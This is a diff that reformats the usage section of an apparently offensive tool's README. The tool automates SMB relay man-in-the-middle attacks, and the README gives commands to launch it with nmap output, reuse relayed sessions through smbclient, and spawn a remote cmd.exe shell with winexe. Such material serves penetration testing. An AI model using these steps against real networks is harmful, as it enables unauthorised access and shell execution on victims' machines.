@@ -5,21 +5,21 @@ Automatically performs the SMB relay attack either locally or on a remote device
 
 ## Usage
 
-1. pip install -r requirements
+* pip install -r requirements
 
-####Remote
+######Remote
 
-2. python autoresp.py -d [remote server internal IP] -x [nmap xml output file from the remote network] -i [remote device interface]
+* python autoresp.py -d [remote server internal IP] -x [nmap xml output file from the remote network] -i [remote device interface]
 
-####Local
+######Local
 
-2. python autoresp.py -x [nmap xml output file from the remote network] -i [interface]
+* python autoresp.py -x [nmap xml output file from the remote network] -i [interface]
 
-3. Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections
+* Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections
 
-4. After a connection is expired (or you expire it), click "choose"
+* After a connection is expired (or you expire it), click "choose"
 
-5. Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1
+* Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1
 
-6. Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe //127.0.0.1 -U "a%a" cmd.exe
+* Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe //127.0.0.1 -U "a%a" cmd.exe
 
